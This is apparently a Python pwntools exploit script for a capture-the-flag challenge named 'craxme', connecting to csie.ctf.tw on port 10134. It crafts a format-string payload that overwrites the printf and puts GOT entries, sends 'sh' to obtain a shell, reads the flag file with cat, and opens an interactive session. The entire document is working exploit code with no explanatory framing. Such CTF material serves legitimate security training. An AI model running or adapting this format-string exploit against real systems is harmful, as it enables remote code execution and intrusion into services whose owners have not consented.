from pwn import *
LOCAL = False
binary = './craxme'

def pause():
    if LOCAL:
        raw_input('pause')
    else:
        sleep(0.2)

r = None
if LOCAL:
    r = process(binary)
else:
    r = remote('csie.ctf.tw', 10134)

context.arch = 'amd64'
elf = ELF(binary)

r.readuntil(":")
printf_got = elf.got['printf']
puts_got = elf.got['puts']
last_val = 0

def write_byte(pos, val, length='hh'):
    global last_val
    target_val = val - last_val
    num_part = "%" +str(int(target_val))+"c"
    if (target_val == 0):
        num_part = ""
    elif (target_val < 0):
        print("wrong order")
    last_val = val
    return  num_part + "%" + str(pos) + "$" + length + "n"

p =  ""
p += write_byte(29, 0x0, length='')
p += write_byte(26, 0x0, length='')
p += write_byte(30, 0x0, length='')
p += write_byte(33, 0x0, length='')
p += write_byte(27, 0x07)
p += write_byte(31, 0x07)
p += write_byte(28, 0x40)
p += write_byte(32, 0x40)
p += write_byte(30, 0x47)
p += write_byte(26, 0x90)
print("payload:", p)
p += 'A' * (160-len(p))
p += p64(printf_got) #26
p += p64(printf_got+1)
p += p64(printf_got+2)
p += p64(printf_got+4)
p += p64(puts_got) #30
p += p64(puts_got+1)
p += p64(puts_got+2)
p += p64(puts_got+4)
print("length check:", len(p) <= 0x100, len(p), int(0x100))

pause()
r.sendline(p)
pause()
r.send('sh\x00')

r.sendline('cat /home/`whoami`/*flag')
r.interactive()
